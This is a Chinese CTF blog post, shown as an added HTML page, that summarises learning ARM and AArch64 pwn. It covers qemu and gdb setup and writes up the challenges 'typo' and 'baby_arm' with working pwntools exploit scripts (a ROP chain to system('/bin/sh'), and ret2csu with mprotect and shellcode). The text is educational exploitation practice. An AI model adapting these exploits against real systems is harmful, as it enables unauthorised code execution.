@@ -1,0 +1,600 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.1.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"zikh26.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="通过这段时间对于arm架构的题目学习，自认为收获还是不少的。下面是对于这段时间关于arm架构的pwn题学习所进行的总结。（我其实还想再多做几道arm架构的栈题的，可是网上所找到的实在不多，等再遇到新的arm架构题目，我再添到这篇文章上吧）">
+<meta property="og:type" content="article">
+<meta property="og:title" content="关于学习arm架构下的pwn的总结">
+<meta property="og:url" content="https://zikh26.github.io/2022/04/26/arm/index.html">
+<meta property="og:site_name" content="ZIKH26">
+<meta property="og:description" content="通过这段时间对于arm架构的题目学习，自认为收获还是不少的。下面是对于这段时间关于arm架构的pwn题学习所进行的总结。（我其实还想再多做几道arm架构的栈题的，可是网上所找到的实在不多，等再遇到新的arm架构题目，我再添到这篇文章上吧）">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://zikh26.github.io/upload/img/image-20220411120012747.png">
+<meta property="og:image" content="https://zikh26.github.io/upload/img/image-20220411120020875.png">
+<meta property="og:image" content="https://zikh26.github.io/upload/img/image-20220411120036603.png">
+<meta property="og:image" content="https://zikh26.github.io/upload/img/image-20220411120043759.png">
+<meta property="og:image" content="https://zikh26.github.io/upload/img/image-20220411120114966.png">
+<meta property="og:image" content="https://zikh26.github.io/upload/img/image-20220411120120429.png">
+<meta property="og:image" content="https://zikh26.github.io/upload/img/image-20220411120128238.png">
+<meta property="og:image" content="https://zikh26.github.io/upload/img/image-20220411120134346.png">
+<meta property="og:image" content="https://zikh26.github.io/upload/img/image-20220411120139937.png">
+<meta property="og:image" content="https://zikh26.github.io/upload/img/image-20220411120149991.png">
+<meta property="og:image" content="https://zikh26.github.io/upload/img/image-20220411120158952.png">
+<meta property="og:image" content="https://zikh26.github.io/upload/img/image-20220411120318807.png">
+<meta property="og:image" content="https://zikh26.github.io/upload/img/image-20220411120322362.png">
+<meta property="og:image" content="https://zikh26.github.io/upload/img/image-20220411120334277.png">
+<meta property="og:image" content="https://zikh26.github.io/upload/img/image-20220411120342873.png">
+<meta property="og:image" content="https://zikh26.github.io/upload/img/image-20220411120349012.png">
+<meta property="og:image" content="https://zikh26.github.io/upload/img/image-20220411120354526.png">
+<meta property="og:image" content="https://zikh26.github.io/upload/img/image-20220411120409648.png">
+<meta property="og:image" content="https://zikh26.github.io/upload/img/image-20220411120419222.png">
+<meta property="og:image" content="https://zikh26.github.io/upload/img/image-20220411120426449.png">
+<meta property="og:image" content="https://zikh26.github.io/upload/img/image-20220411120432376.png">
+<meta property="og:image" content="https://zikh26.github.io/upload/img/image-20220411120437246.png">
+<meta property="og:image" content="https://zikh26.github.io/upload/img/image-20220411120446659.png">
+<meta property="og:image" content="https://zikh26.github.io/upload/img/image-20220411120452691.png">
+<meta property="og:image" content="https://zikh26.github.io/upload/img/image-20220411120503162.png">
+<meta property="og:image" content="https://zikh26.github.io/upload/img/image-20220411120508697.png">
+<meta property="og:image" content="https://zikh26.github.io/upload/img/image-20220411120531192.png">
+<meta property="og:image" content="https://zikh26.github.io/upload/img/image-20220411120543845.png">
+<meta property="og:image" content="https://zikh26.github.io/upload/img/image-20220411120556623.png">
+<meta property="og:image" content="https://zikh26.github.io/upload/img/image-20220411120602011.png">
+<meta property="og:image" content="https://zikh26.github.io/upload/img/image-20220411120608563.png">
+<meta property="og:image" content="https://zikh26.github.io/upload/img/image-20220411120618160.png">
+<meta property="article:published_time" content="2022-04-26T02:48:05.026Z">
+<meta property="article:modified_time" content="2022-04-26T02:48:05.026Z">
+<meta property="article:author" content="ZIKH26">
+<meta property="article:tag" content="PWN">
+<meta property="article:tag" content="ARM">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://zikh26.github.io/upload/img/image-20220411120012747.png">
+
+<link rel="canonical" href="https://zikh26.github.io/2022/04/26/arm/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>关于学习arm架构下的pwn的总结 | ZIKH26</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">ZIKH26</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">pwn</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/2022/04/26/arm/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/20220411214643.jpg">
+      <meta itemprop="name" content="ZIKH26">
+      <meta itemprop="description" content="未来一位优秀的pwner的博客">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ZIKH26">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          关于学习arm架构下的pwn的总结
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-04-26 02:48:05" itemprop="dateCreated datePublished" datetime="2022-04-26T02:48:05+00:00">2022-04-26</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <blockquote>
+<p>通过这段时间对于arm架构的题目学习，自认为收获还是不少的。下面是对于这段时间关于arm架构的pwn题学习所进行的总结。（我其实还想再多做几道arm架构的栈题的，可是网上所找到的实在不多，等再遇到新的arm架构题目，我再添到这篇文章上吧）</p>
+</blockquote>
+<span id="more"></span>
+<h1 id="运行程序-amp-amp-启动调试"><a href="#运行程序-amp-amp-启动调试" class="headerlink" title="运行程序&amp;&amp;启动调试"></a>运行程序&amp;&amp;启动调试</h1><p>咋装的环境已经忘记了…（装完环境过了一段时间才开始arm架构的学习）装配环境的话，上网搜一下文章也不少。可以参考这篇文章  <a target="_blank" rel="noopener" href="https://blog.csdn.net/A951860555/article/details/116780827#_4">(26条消息) CTF pwn – ARM架构的pwn题详解___lifanxin的博客-CSDN博客</a></p>
+<p>记录一下怎么启动以及调试arm架构的程序。</p>
+<p>先checksec一下（或者用file命令也行），看看是什么架构的。</p>
+<p><img src="/upload/img/image-20220411120012747.png" alt="image-20220411120012747"></p>
+<p><img src="/upload/img/image-20220411120020875.png" alt="image-20220411120020875"></p>
+<p>file命令可以查看程序是动态链接还是静态链接。</p>
+<h2 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h2><p>如果程序是静态链接并且是32位 arm架构的话，输入qemu-arm .&#x2F;程序名</p>
+<p>如果程序是静态链接并且是aarch64架构的话，输入qemu-aarch .&#x2F;程序名</p>
+<p>如果程序是动态链接且是32位 arm架构的话，输入qemu-arm -L  &#x2F;usr&#x2F;arm-linux-gnueabihf .&#x2F;程序名</p>
+<p>如果程序是动态链接且是aarch64架构的话，输入qemu-aarch64 -L &#x2F;usr&#x2F;aarch64-linux-gnu  .&#x2F;程序名	</p>
+<h2 id="启动调试"><a href="#启动调试" class="headerlink" title="启动调试"></a>启动调试</h2><p><strong>启动调试和运行程序的命令很相似，仅仅是加了一个参数-g 然后后面跟一个端口</strong>。</p>
+<p>比如程序是动态链接的32位 arm架构的话，输入qemu-arm -g 1234 -L &#x2F;usr&#x2F;aarch64-linux-gnu .&#x2F;程序名</p>
+<p>这个1234是你指定的端口，指定别的端口也可以。然后参照运行程序那四个命令以及上面这个命令，就可以依次类推出调试aarch64架构的命令了。</p>
+<p>此时再打开另一个终端，输入gdb-multiarch（<strong>必须是用pwndbg，如果是peda的话，是没法正常调试的</strong>）</p>
+<p>然后再输入target remote localhost:1234   连接到刚才开的那个端口。</p>
+<p><img src="/upload/img/image-20220411120036603.png" alt="image-20220411120036603"></p>
+<p>进入调试效果如图</p>
+<p><img src="/upload/img/image-20220411120043759.png" alt="image-20220411120043759"></p>
+<p>不知道为啥，arm架构进去调试似乎不是从main函数开始的，如果单步的话需要走很久很久，可以进去之后用b在想停留的那个地方下个断点，然后c过去，这样会快很多。</p>
+<h2 id="遇见的报错"><a href="#遇见的报错" class="headerlink" title="遇见的报错"></a>遇见的报错</h2><p>1、如果32位遇见这个报错的话：&#x2F;lib&#x2F;ld-linux-armhf.so.3: No such file or directory    </p>
+<p>输入命令sudo apt-get install libc6-armhf-cross</p>
+<p>2、如果遇见这个报错的话：Invalid ELF image for this architecture</p>
+<p>就说明你的qemu后面跟的参数不对，就比如你这个程序是aarch64架构的，但是你qemu后面跟的是-arm。如果你这个程序是aarch64架构的，正确做法应该是qemu后面跟着-aarch64	</p>
+<p>然后关于arm架构下的指令，在网上能搜到很多，也解释的比较清楚，我就不在这里赘述了。</p>
+<p>下面三道例题（其实我是想多写几道的，但是在网上找到可下载的题目只有这三道（还有个堆题，等学堆了再做））的下载链接：</p>
+<p>链接: <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1dRbm8k5qup7Anj9UDrsBlA?pwd=ecpr">https://pan.baidu.com/s/1dRbm8k5qup7Anj9UDrsBlA?pwd=ecpr</a> 提取码: ecpr </p>
+<h1 id="typo"><a href="#typo" class="headerlink" title="typo"></a>typo</h1><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>通过这道题的收获与学习有：</p>
+<p>1、这是做的第一道arm架构的题目，考察的就是最简单的rop，学习到了arm32的寄存器传参方式，以及最简单的rop利用。</p>
+<p>2、在面对静态链接的程序，IDA打开之后会发现里面有几百个函数，而且也搜不到main函数，在这种情况下，可以利用搜<strong>索关键字符串，通过关键字符串去找主函数</strong>。</p>
+<p>3、不知道是不是我的错觉，在考察简单的rop情况下，似乎师傅们都没有去花很多的精力去查看ida生成的伪代码（确实伪代码太多了），直接gdb打开看完偏移就是干。</p>
+<p>4、在面对静态链接的程序，从ida中分析可能会异常的麻烦，如果有可能的话，其实可以靠输入内容之后观察程序的回显，猜测一些程序功能。</p>
+<h2 id="保护策略"><a href="#保护策略" class="headerlink" title="保护策略"></a>保护策略</h2><p><img src="/upload/img/image-20220411120114966.png" alt="image-20220411120114966"></p>
+<h2 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h2><p>打开IDA之后，可以发现是静态链接，旁边有非常多的函数，难以迅速定位到主函数。因此采用一种比较好用的方法。</p>
+<p>先运行一下这个程序，发现有这种字符串</p>
+<p><img src="/upload/img/image-20220411120120429.png" alt="image-20220411120120429"></p>
+<p>那就在IDA里面用shift+F12，查看一下这个字符串。</p>
+<p><img src="/upload/img/image-20220411120128238.png" alt="image-20220411120128238"></p>
+<p>然后看一下引用，如此就可以找到主函数了</p>
+<p><img src="/upload/img/image-20220411120134346.png" alt="image-20220411120134346"></p>
+<p>跳到汇编代码处，F5一下，即可看到主函数的伪代码（直接搜main函数的话，也是搜不到的）</p>
+<p><img src="/upload/img/image-20220411120139937.png" alt="image-20220411120139937"></p>
+<p>直接看伪代码有点懵，先输入一些垃圾数据（第一次必须要输入一个回车），看看是否存在溢出</p>
+<p><img src="/upload/img/image-20220411120149991.png" alt="image-20220411120149991"></p>
+<p>发现段错误了，那就说明存在溢出。然后用gdb调试一下，看看溢出是多少。</p>
+<p>最初我企图用gdb单步到输入函数，然后输入垃圾数据，不过单步了很久发现依旧没有到可输入的地方，通过去看其他师傅的博客，发现了一个方便的方法。<strong>我们启动gdb之后直接输入c。c的本意是去continue到下一个断点，可是我们压根就没有下断点，因此能让这个continue停下的办法就是碰到输入函数</strong>（这一招确实妙啊）。</p>
+<p><img src="/upload/img/image-20220411120158952.png" alt="image-20220411120158952"></p>
+<p>我们第一次先输入一个回车</p>
+<h3 id="插入一点：如果不输入回车呢？"><a href="#插入一点：如果不输入回车呢？" class="headerlink" title="插入一点：如果不输入回车呢？"></a>插入一点：如果不输入回车呢？</h3><p>不输入回车，去输入别的内容的话，程序会将我们输入的内容丢弃第一个字符，从而把后面的内容去当做命令处理。<br><img src="/upload/img/image-20220411120318807.png" alt="image-20220411120318807"></p>
+<p>可以发现第一次输入了个kkkkkkkkk，结果报了一个command not found。那就说明这个程序试图将我们输入的内容当做命令执行。</p>
+<p><img src="/upload/img/image-20220411120322362.png" alt="image-20220411120322362"></p>
+<p>可是我们输入ls的话，它说s这个命令没有被执行，由此猜测，第一个字符被丢弃了。</p>
+<p><img src="/upload/img/image-20220411120334277.png" alt="image-20220411120334277"></p>
+<p>结合上图发现，事实确实如此，可是这样就发现我们输入的内容当做指令执行的话，程序就结束了，因此我们尝试只输入一个回车看看会怎么样？</p>
+<p><img src="/upload/img/image-20220411120342873.png" alt="image-20220411120342873"></p>
+<p>程序开始继续运行了。而且值得一提的是，人家英语也说了，按下回车键就会开始。</p>
+<p>继续回归正题</p>
+<p>怎么去确定偏移量？我们采用cyclic去确定输入点距离返回地址的偏移。</p>
+<p><img src="/upload/img/image-20220411120349012.png" alt="image-20220411120349012"></p>
+<p>用cyclic填充两百个字符，然后用cyclic -l得到偏移。</p>
+<p><img src="/upload/img/image-20220411120354526.png" alt="image-20220411120354526"></p>
+<p>因为这是静态链接，因此我们可以很轻松的去里面拿到我们想要的&#x2F;bin&#x2F;sh参数和system函数。</p>
+<p>事实上我们没有办法搜到system函数，但是猜测一下，system会调用&#x2F;bin&#x2F;sh，因此我们先去找一下&#x2F;bin&#x2F;sh</p>
+<p><img src="/upload/img/image-20220411120409648.png" alt="image-20220411120409648"><br><img src="/upload/img/image-20220411120419222.png" alt="image-20220411120419222"></p>
+<p><strong>如果你的IDA没有出现上面红框里面的内容，就说明IDA还没有把所有的数据装载完，等一会就行了。</strong></p>
+<p>然后点上面红色框跳转过来，就是这个函数。</p>
+<p><img src="/upload/img/image-20220411120426449.png" alt="image-20220411120426449"></p>
+<p>虽然我看不出来他是个system函数，但是有关系嘛？没有关系。如此，system函数的地址就是 0x10ba8</p>
+<p><img src="/upload/img/image-20220411120432376.png" alt="image-20220411120432376"></p>
+<h2 id="arm架构的基本知识"><a href="#arm架构的基本知识" class="headerlink" title="arm架构的基本知识"></a>arm架构的基本知识</h2><h3 id="arm32位"><a href="#arm32位" class="headerlink" title="arm32位"></a>arm32位</h3><p>这个arm32位的话，<strong>传前四个参数是用的r0~r3寄存器</strong>，如果<strong>参数再多的话，就利用栈传参</strong>（从右向左依次入栈）。<strong>函数的返回值会存在r0寄存器</strong>中。然后<strong>pc寄存器就相当于x86中的eip寄存器</strong>（始终装的都是我们下一条指令执行的地址）除此之外，<strong>arm 的 b&#x2F;bl 等指令实现跳转</strong>。</p>
+<p>因此我们就先去看看有什么可以控制r0寄存器的gadget。</p>
+<p><img src="/upload/img/image-20220411120437246.png" alt="image-20220411120437246"></p>
+<p>这个pop r0 r4 pc就很nice。</p>
+<p>r4我们随便填充，pc你可以理解为ret的效果。然后payload格式跟x86的差不多。</p>
+<h2 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./typo&#x27;</span>)</span><br><span class="line">offset=<span class="number">112</span></span><br><span class="line">pop_r0_r4_pc_addr=<span class="number">0x00020904</span></span><br><span class="line">bin_sh_addr=<span class="number">0x0006c384</span></span><br><span class="line">sys_addr=<span class="number">0x00010BA8</span></span><br><span class="line">p.send(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">payload=offset*<span class="string">&#x27;a&#x27;</span>+p32(pop_r0_r4_pc_addr)+p32(bin_sh_addr)+p32(<span class="number">0</span>)+p32(sys_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()                 </span><br></pre></td></tr></table></figure>
+
+<h1 id="Shanghai2018-–-baby-arm"><a href="#Shanghai2018-–-baby-arm" class="headerlink" title="Shanghai2018 – baby_arm"></a>Shanghai2018 – baby_arm</h1><h2 id="总结：-1"><a href="#总结：-1" class="headerlink" title="总结："></a>总结：</h2><p>通过这道题的学习与收获有：</p>
+<p>1、这道题也算是学习了arrch64架构下的ret2csu，与x86中的区别其实并不大。</p>
+<p>2、mprotect函数去修改内存属性，从而执行shellcode</p>
+<h2 id="保护策略："><a href="#保护策略：" class="headerlink" title="保护策略："></a>保护策略：</h2><p><img src="/upload/img/image-20220411120446659.png" alt="image-20220411120446659"></p>
+<h2 id="程序分析："><a href="#程序分析：" class="headerlink" title="程序分析："></a>程序分析：</h2><p><img src="/upload/img/image-20220411120452691.png" alt="image-20220411120452691"></p>
+<p>程序逻辑很简单，read一次输入，输入到bss段，没法溢出。然后sub_4007F0函数也有一次输入，输入到栈里，存在溢出。</p>
+<p><img src="/upload/img/image-20220411120503162.png" alt="image-20220411120503162"></p>
+<p>同时程序中存在一个mprotect函数。</p>
+<h2 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h2><h3 id="劫持执行流"><a href="#劫持执行流" class="headerlink" title="劫持执行流"></a>劫持执行流</h3><p>这道题发现在第二个read结束后，我们的数据并不能覆盖返回地址（此时返回地址在我们输入数据的上面）（如下图）</p>
+<img src="/upload/img/image-20220411120508697.png" alt="image-20220411120508697" style="zoom:25%;" />
+
+
+<p>不过我们发现在0x400860的地方还有一个ret，我们单步到这个ret看看，此时的x30是什么。</p>
+<img src="/upload/img/image-20220411120531192.png" alt="image-20220411120531192" style="zoom:33%;" />
+
+
+<p>可以发现此时的x30，就是距离栈顶为2的内容，而这个内容对应的栈地址0x40007fffb8则是在我们第二次read输入的起始地址下面，也就是说我们可以控制这个地址，从而来劫持程序的执行流。</p>
+<h3 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu?"></a>ret2csu?</h3><p>由于mprotect函数可以改变内存的属性，本来这道题是bss段是只能写的，不过我们可以用mprotect将bss段变成可执行，然后往里面输入个shellcode就ok了。怎么控制mprotect的参数？</p>
+<p>我们发现，arm架构下，也有一段汇编可以控制寄存器参数（完全可以把这段当成x86中的csu）</p>
+<p><img src="/upload/img/image-20220411120543845.png" alt="image-20220411120543845"></p>
+<p>先分析下面的loc_4008cc的内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">LDP             X19, X20, [SP,#var_s10]</span><br><span class="line">LDP             X21, X22, [SP,#var_s20]</span><br><span class="line">LDP             X23, X24, [SP,#var_s30]</span><br><span class="line">LDP             X29, X30, [SP+var_s0],#0x40                </span><br><span class="line">RET</span><br></pre></td></tr></table></figure>
+
+<p>第一句这个LDP         X19, X20, [SP,#var_s10]就是说将SP+0x10所指向的内容给x19和x20寄存器（x19寄存器拿的是SP+0x10所指向的内容，而x20寄存器拿的是SP+0x18所指向的内容）</p>
+<p>然后第四句这个LDP         X29, X30, [SP+var_s0],#0x40的意思是将SP所指向的内容给x29和x30寄存器（x29寄存器拿的是SP所指向的内容，而x30寄存器拿的是SP+0x8所指向的内容），完成这句指令之后，再将SP指针增加0x40个字节。</p>
+<p>然后ret，这个就是返回到x30寄存器所存储的值。</p>
+<p>再结合着刚刚分析的内容，来看一下loc_4008ac的内容。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">LDR             X3, [X21,X19,LSL#3]</span><br><span class="line">MOV             X2, X22</span><br><span class="line">MOV             X1, X23</span><br><span class="line">MOV             W0, W24</span><br><span class="line">ADD             X19, X19, #1</span><br><span class="line">BLR             X3</span><br><span class="line">CMP             X19, X20</span><br><span class="line">B.NE            loc_4008AC</span><br></pre></td></tr></table></figure>
+
+<p>第一句就是说将x19的值逻辑左移3位，然后加上x21的值，将得到的这个值所指向内容给x3寄存器。（如果我们控制x19的值为0的话，就是说把x21寄存器的值所指向的内容给x3寄存器。</p>
+<p>然后剩下的mov，add就没什么好说的了。</p>
+<p>倒数第三行BLR指令是去跳转到X3寄存器的值，同时把下一个指令的地址存到x30里面。</p>
+<p>然后下面的CMP和x86里面的一样了。</p>
+<p>如此思路就出来了，几乎是跟ret2csu的利用方法一样。有两点需要注意一下。第一点就是loc_4008cc中的</p>
+<p>LDP             X29, X30, [SP+var_s0],#0x40    这个指令，虽然<strong>它是在这个loc_4008cc函数的最后，但是它传给x29和x30寄存器的时候，拿的是栈顶的值。因此布置栈中数据的时候，栈顶的内容应该是存放的x29和x30的值。</strong></p>
+<p>第二点，<strong>是BLR X3的时候，这个X3的值溯源一下，它是由X21充当指针来指向的，而X21的值又是SP+0x20充当指针来指向的。意思就是说，我们最终想跳转的内容必须被指针的指针所指向，因此考虑的是将X3的内容放在bss段，然后X21去存储bss段的地址（指向X3的内容），然后再把X21的值布置在栈里面</strong>。最后X3的值放入mprotect的plt地址即可（<strong>因为BLR跳的话，直接跳到了寄存器的值处，因此这里应该放的是plt地址（要求这个地址装的就是指令）</strong>，got地址（装的是got表，而got表中装的才是指令）是用于指针寻址跳转的情况，当时在这里迷了一下）。</p>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;aarch64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26705</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./zhengchang&#x27;</span>)</span><br><span class="line">mprotect_got=e.got[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">mprotect_plt=e.plt[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">offset=<span class="number">0x48</span></span><br><span class="line">bss_addr=<span class="number">0x411068</span></span><br><span class="line">csu1=<span class="number">0x4008CC</span></span><br><span class="line">csu2=<span class="number">0x4008AC</span></span><br><span class="line">shellcode=asm(shellcraft.aarch64.sh())</span><br><span class="line">shellcode=shellcode.ljust(<span class="number">0x100</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">shellcode+=p64(mprotect_plt)</span><br><span class="line">payload1=shellcode</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Name:&#x27;</span>,payload1)</span><br><span class="line">payload2=offset*<span class="string">&#x27;a&#x27;</span>+p64(csu1)</span><br><span class="line">payload2+=p64(<span class="number">0</span>)+p64(csu2) <span class="comment">#x29 x30</span></span><br><span class="line">payload2+=p64(<span class="number">0</span>)+p64(<span class="number">1</span>) <span class="comment">#x19 x20</span></span><br><span class="line">payload2+=p64(bss_addr+<span class="number">0x100</span>)+p64(<span class="number">7</span>)<span class="comment">#x21 x22  分别赋值给了x3 x2</span></span><br><span class="line">payload2+=p64(<span class="number">0x1000</span>)+p64(<span class="number">0x411000</span>)<span class="comment">#x23 x24  分别赋值给了x1 w0</span></span><br><span class="line">payload2+=p64(<span class="number">0</span>)+p64(bss_addr)<span class="comment">#x29 x30</span></span><br><span class="line">payload2+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)<span class="comment">#x19 x20</span></span><br><span class="line">payload2+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)<span class="comment">#x21 x22</span></span><br><span class="line">payload2+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)<span class="comment">#x23 x24</span></span><br><span class="line">pause()</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="inctf2018-wARMup"><a href="#inctf2018-wARMup" class="headerlink" title="inctf2018_wARMup"></a>inctf2018_wARMup</h1><h2 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h2><p>通过这道题的学习与收获有：</p>
+<p>1、arm架构（32位）的bss段是可执行的！</p>
+<p>2、这道题考察的是栈迁移，以及通过调试来确定payload的布局。这道题是比较锻炼调试能力的（至少对于现在的我来说），锻炼调试能力，我指的是不看exp的情况下，自己做这道题…</p>
+<p>3、现在也做了三道arm架构的题了，说实话和x86下的区别不大。只要熟悉x86的做题思路，做这种题，应该很快就能适应。</p>
+<h2 id="保护策略：-1"><a href="#保护策略：-1" class="headerlink" title="保护策略："></a>保护策略：</h2><p><img src="/upload/img/image-20220411120556623.png" alt="image-20220411120556623"></p>
+<h2 id="程序分析：-1"><a href="#程序分析：-1" class="headerlink" title="程序分析："></a>程序分析：</h2><p><img src="/upload/img/image-20220411120602011.png" alt="image-20220411120602011"></p>
+<p>存在溢出点，但是可溢出的字节很少，因此考虑栈迁移。且没有后门函数</p>
